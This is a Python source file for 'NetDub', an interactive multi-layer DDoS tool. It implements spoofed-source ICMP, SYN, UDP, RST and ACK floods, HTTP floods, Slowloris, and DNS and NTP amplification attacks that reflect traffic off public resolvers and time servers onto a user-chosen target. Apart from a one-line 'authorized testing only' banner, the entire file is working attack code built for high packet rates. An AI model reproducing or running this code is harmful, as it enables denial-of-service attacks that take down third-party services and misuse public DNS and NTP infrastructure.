#!/usr/bin/env python3
"""
NetDub - Final DDoS Test Suite
High-Performance Multi-Layer DDoS Testing Tool
Requires: Root privileges for raw socket operations
"""

import os
import sys
import socket
import struct
import random
import threading
import time
import subprocess
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
import requests
from colorama import Fore, init

# Check root privileges
if os.geteuid() != 0:
    print(f"{Fore.RED}[!] This tool requires root privileges{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Run with: sudo python3 {sys.argv[0]}{Fore.RESET}")
    sys.exit(1)

init()

class NetDub:
    def __init__(self):
        self.target_host = None
        self.target_ip = None
        self.target_port = None
        self.threads = []
        self.running = False
        self.pps_counter = 0
        self.start_time = 0
        
        # Performance settings
        self.max_threads = 1000
        self.raw_socket_pool = []
        
        self.banner()
    
    def banner(self):
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.RED}║                        NetDub v2.0                          ║{Fore.RESET}")
        print(f"{Fore.RED}║                 Final DDoS Test Suite                       ║{Fore.RESET}")
        print(f"{Fore.RED}║              High-Performance Multi-Layer                   ║{Fore.RESET}")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}")
        print(f"{Fore.YELLOW}⚠️  For authorized security testing only{Fore.RESET}")
        print(f"{Fore.CYAN}📊 Target: 1.2M+ PPS capability{Fore.RESET}")
        print()
    
    def resolve_target(self, host):
        """Resolve hostname to IP"""
        try:
            self.target_ip = socket.gethostbyname(host)
            print(f"{Fore.GREEN}[✓] Resolved {host} → {self.target_ip}{Fore.RESET}")
            return True
        except:
            print(f"{Fore.RED}[✗] Failed to resolve {host}{Fore.RESET}")
            return False
    
    def create_raw_socket(self):
        """Create raw socket with SO_REUSEADDR"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except:
            return None
    
    def init_raw_sockets(self, count=100):
        """Initialize raw socket pool"""
        print(f"{Fore.CYAN}[*] Initializing {count} raw sockets...{Fore.RESET}")
        for _ in range(count):
            sock = self.create_raw_socket()
            if sock:
                self.raw_socket_pool.append(sock)
        print(f"{Fore.GREEN}[✓] Created {len(self.raw_socket_pool)} raw sockets{Fore.RESET}")
    
    def ip_checksum(self, ip_header):
        """Calculate IP checksum"""
        checksum = 0
        for i in range(0, len(ip_header), 2):
            word = (ip_header[i] << 8) + ip_header[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        return checksum
    
    def create_ip_header(self, src_ip, dst_ip, protocol):
        """Create IP header"""
        version = 4
        ihl = 5
        tos = 0
        tot_len = 40
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        check = 0
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl, tos, tot_len, id,
                               frag_off, ttl, protocol, check,
                               socket.inet_aton(src_ip),
                               socket.inet_aton(dst_ip))
        
        check = self.ip_checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl, tos, tot_len, id,
                               frag_off, ttl, protocol, check,
                               socket.inet_aton(src_ip),
                               socket.inet_aton(dst_ip))
        return ip_header
    
    # ==================== LAYER 3 ATTACKS ====================
    
    def icmp_flood(self, duration=60):
        """ICMP Flood Attack"""
        print(f"{Fore.CYAN}[*] Starting ICMP Flood for {duration}s...{Fore.RESET}")
        
        def icmp_worker():
            if not self.raw_socket_pool:
                return
            
            sock = random.choice(self.raw_socket_pool)
            while self.running:
                try:
                    # Random source IP
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    
                    # Create ICMP packet
                    packet = IP(src=src_ip, dst=self.target_ip)/ICMP(type=8, code=0)/Raw(b"X"*1000)
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        # Start threads
        for _ in range(self.max_threads):
            t = threading.Thread(target=icmp_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Monitor
        self.monitor_attack(duration)
    
    def syn_flood(self, duration=60):
        """SYN Flood Attack"""
        print(f"{Fore.CYAN}[*] Starting SYN Flood for {duration}s...{Fore.RESET}")
        
        def syn_worker():
            while self.running:
                try:
                    # Random source
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    src_port = random.randint(1024, 65535)
                    
                    # Create SYN packet
                    packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1, 2147483647))
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        # Start threads
        for _ in range(self.max_threads):
            t = threading.Thread(target=syn_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    def udp_flood(self, duration=60):
        """UDP Flood Attack"""
        print(f"{Fore.CYAN}[*] Starting UDP Flood for {duration}s...{Fore.RESET}")
        
        def udp_worker():
            while self.running:
                try:
                    # Random source
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    src_port = random.randint(1024, 65535)
                    dst_port = random.randint(1, 65535)
                    
                    # Create UDP packet with random payload
                    payload = os.urandom(1024)
                    packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=dst_port)/Raw(payload)
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        # Start threads
        for _ in range(self.max_threads):
            t = threading.Thread(target=udp_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    # ==================== LAYER 4 ATTACKS ====================
    
    def tcp_rst_flood(self, duration=60):
        """TCP RST Flood Attack"""
        print(f"{Fore.CYAN}[*] Starting TCP RST Flood for {duration}s...{Fore.RESET}")
        
        def rst_worker():
            while self.running:
                try:
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    src_port = random.randint(1024, 65535)
                    
                    # RST packet
                    packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="R", seq=random.randint(1, 2147483647))
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        for _ in range(self.max_threads):
            t = threading.Thread(target=rst_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    def ack_flood(self, duration=60):
        """TCP ACK Flood Attack"""
        print(f"{Fore.CYAN}[*] Starting TCP ACK Flood for {duration}s...{Fore.RESET}")
        
        def ack_worker():
            while self.running:
                try:
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    src_port = random.randint(1024, 65535)
                    
                    # ACK packet
                    packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="A", seq=random.randint(1, 2147483647), ack=random.randint(1, 2147483647))
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        for _ in range(self.max_threads):
            t = threading.Thread(target=ack_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    # ==================== LAYER 7 ATTACKS ====================
    
    def http_flood(self, duration=60):
        """HTTP Flood Attack"""
        print(f"{Fore.CYAN}[*] Starting HTTP Flood for {duration}s...{Fore.RESET}")
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        def http_worker():
            session = requests.Session()
            while self.running:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0'
                    }
                    
                    url = f"http://{self.target_host}:{self.target_port}/?{random.randint(1, 10000)}"
                    response = session.get(url, headers=headers, timeout=1)
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        for _ in range(200):  # Less threads for HTTP
            t = threading.Thread(target=http_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    def slowloris_attack(self, duration=60):
        """Slowloris Attack"""
        print(f"{Fore.CYAN}[*] Starting Slowloris Attack for {duration}s...{Fore.RESET}")
        
        sockets = []
        
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\\r\\n".encode())
                sock.send(f"Host: {self.target_host}\\r\\n".encode())
                sock.send("User-Agent: Mozilla/5.0\\r\\n".encode())
                sock.send("Accept-language: en-US,en,q=0.5\\r\\n".encode())
                sock.send("Connection: keep-alive\\r\\n".encode())
                
                return sock
            except:
                return None
        
        # Create initial connections
        for _ in range(500):
            sock = create_socket()
            if sock:
                sockets.append(sock)
        
        print(f"{Fore.GREEN}[✓] Created {len(sockets)} slowloris connections{Fore.RESET}")
        
        self.running = True
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            # Send keep-alive headers
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\\r\\n".encode())
                    self.pps_counter += 1
                except:
                    sockets.remove(sock)
            
            # Maintain connections
            while len(sockets) < 500:
                sock = create_socket()
                if sock:
                    sockets.append(sock)
            
            time.sleep(10)
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    # ==================== AMPLIFICATION ATTACKS ====================
    
    def dns_amplification(self, duration=60):
        """DNS Amplification Attack"""
        print(f"{Fore.CYAN}[*] Starting DNS Amplification for {duration}s...{Fore.RESET}")
        
        # Public DNS servers
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "208.67.222.222", "208.67.220.220"
        ]
        
        def dns_worker():
            while self.running:
                try:
                    dns_server = random.choice(dns_servers)
                    
                    # Create DNS query packet with spoofed source
                    packet = IP(src=self.target_ip, dst=dns_server)/UDP(sport=53, dport=53)/DNS(rd=1, qd=DNSQR(qname="version.bind", qtype="TXT", qclass="CH"))
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        for _ in range(self.max_threads):
            t = threading.Thread(target=dns_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    def ntp_amplification(self, duration=60):
        """NTP Amplification Attack"""
        print(f"{Fore.CYAN}[*] Starting NTP Amplification for {duration}s...{Fore.RESET}")
        
        # NTP servers
        ntp_servers = [
            "pool.ntp.org", "time.google.com", "time.cloudflare.com"
        ]
        
        def ntp_worker():
            while self.running:
                try:
                    ntp_server = random.choice(ntp_servers)
                    ntp_ip = socket.gethostbyname(ntp_server)
                    
                    # NTP monlist request
                    packet = IP(src=self.target_ip, dst=ntp_ip)/UDP(sport=123, dport=123)/Raw(b"\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00")
                    send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        for _ in range(self.max_threads):
            t = threading.Thread(target=ntp_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    # ==================== MIXED ATTACKS ====================
    
    def mixed_attack(self, duration=60):
        """Mixed Layer Attack"""
        print(f"{Fore.CYAN}[*] Starting Mixed Layer Attack for {duration}s...{Fore.RESET}")
        
        attack_methods = [
            self.icmp_flood, self.syn_flood, self.udp_flood,
            self.tcp_rst_flood, self.ack_flood, self.http_flood
        ]
        
        def mixed_worker():
            while self.running:
                try:
                    # Random attack method
                    attack = random.choice(attack_methods)
                    
                    # Execute for short duration
                    if attack == self.http_flood:
                        # HTTP attack
                        session = requests.Session()
                        headers = {'User-Agent': 'Mozilla/5.0'}
                        url = f"http://{self.target_host}:{self.target_port}/?{random.randint(1, 10000)}"
                        response = session.get(url, headers=headers, timeout=1)
                    else:
                        # Packet-based attack
                        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                        src_port = random.randint(1024, 65535)
                        
                        if attack == self.icmp_flood:
                            packet = IP(src=src_ip, dst=self.target_ip)/ICMP(type=8, code=0)/Raw(b"X"*1000)
                        elif attack == self.syn_flood:
                            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S")
                        elif attack == self.udp_flood:
                            packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=self.target_port)/Raw(os.urandom(1024))
                        elif attack == self.tcp_rst_flood:
                            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="R")
                        elif attack == self.ack_flood:
                            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="A")
                        
                        send(packet, verbose=0, iface="eth0")
                    
                    self.pps_counter += 1
                except:
                    continue
        
        self.running = True
        self.start_time = time.time()
        
        for _ in range(self.max_threads):
            t = threading.Thread(target=mixed_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.monitor_attack(duration)
    
    # ==================== MONITORING ====================
    
    def monitor_attack(self, duration):
        """Monitor attack progress"""
        try:
            while self.running and (time.time() - self.start_time) < duration:
                elapsed = time.time() - self.start_time
                pps = self.pps_counter / elapsed if elapsed > 0 else 0
                
                print(f"{Fore.YELLOW}[📊] PPS: {pps:,.0f} | Total: {self.pps_counter:,} | Time: {elapsed:.1f}s{Fore.RESET}")
                
                # Check if target reached
                if pps >= 1200000:  # 1.2M PPS
                    print(f"{Fore.RED}[🔥] TARGET REACHED: {pps:,.0f} PPS{Fore.RESET}")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            print(f"{Fore.GREEN}[✓] Attack completed{Fore.RESET}")
            
            # Final stats
            elapsed = time.time() - self.start_time
            final_pps = self.pps_counter / elapsed if elapsed > 0 else 0
            print(f"{Fore.CYAN}[📈] Final Stats: {final_pps:,.0f} PPS | {self.pps_counter:,} total packets{Fore.RESET}")
    
    # ==================== MAIN INTERFACE ====================
    
    def run(self):
        """Main interface"""
        try:
            # Get target
            self.target_host = input(f"{Fore.GREEN}🎯 Target (domain/IP): {Fore.RESET}").strip()
            self.target_port = int(input(f"{Fore.GREEN}🔌 Port: {Fore.RESET}").strip())
            
            # Resolve target
            if not self.resolve_target(self.target_host):
                return
            
            # Initialize raw sockets
            self.init_raw_sockets()
            
            # Show menu
            while True:
                print(f"\\n{Fore.CYAN}╔════════════════════════════════════════╗{Fore.RESET}")
                print(f"{Fore.CYAN}║              ATTACK MENU               ║{Fore.RESET}")
                print(f"{Fore.CYAN}╚════════════════════════════════════════╝{Fore.RESET}")
                print(f"{Fore.YELLOW}[1] ICMP Flood (Layer 3){Fore.RESET}")
                print(f"{Fore.YELLOW}[2] SYN Flood (Layer 4){Fore.RESET}")
                print(f"{Fore.YELLOW}[3] UDP Flood (Layer 4){Fore.RESET}")
                print(f"{Fore.YELLOW}[4] TCP RST Flood (Layer 4){Fore.RESET}")
                print(f"{Fore.YELLOW}[5] TCP ACK Flood (Layer 4){Fore.RESET}")
                print(f"{Fore.YELLOW}[6] HTTP Flood (Layer 7){Fore.RESET}")
                print(f"{Fore.YELLOW}[7] Slowloris (Layer 7){Fore.RESET}")
                print(f"{Fore.YELLOW}[8] DNS Amplification{Fore.RESET}")
                print(f"{Fore.YELLOW}[9] NTP Amplification{Fore.RESET}")
                print(f"{Fore.RED}[10] Mixed Attack (ALL LAYERS){Fore.RESET}")
                print(f"{Fore.RED}[99] Exit{Fore.RESET}")
                
                choice = input(f"{Fore.GREEN}➤ Select attack: {Fore.RESET}").strip()
                
                if choice == "99":
                    break
                    
                duration = int(input(f"{Fore.GREEN}⏱️  Duration (seconds): {Fore.RESET}").strip())
                
                # Reset counters
                self.pps_counter = 0
                self.threads = []
                
                # Execute attack
                attacks = {
                    "1": self.icmp_flood,
                    "2": self.syn_flood,
                    "3": self.udp_flood,
                    "4": self.tcp_rst_flood,
                    "5": self.ack_flood,
                    "6": self.http_flood,
                    "7": self.slowloris_attack,
                    "8": self.dns_amplification,
                    "9": self.ntp_amplification,
                    "10": self.mixed_attack
                }
                
                if choice in attacks:
                    print(f"{Fore.RED}[⚡] Launching attack...{Fore.RESET}")
                    attacks[choice](duration)
                else:
                    print(f"{Fore.RED}[!] Invalid choice{Fore.RESET}")
                
        except KeyboardInterrupt:
            print(f"\\n{Fore.RED}[!] Interrupted by user{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")
        finally:
            self.running = False
            # Cleanup
            for sock in self.raw_socket_pool:
                try:
                    sock.close()
                except:
                    pass

if __name__ == "__main__":
    netdub = NetDub()
    netdub.run()
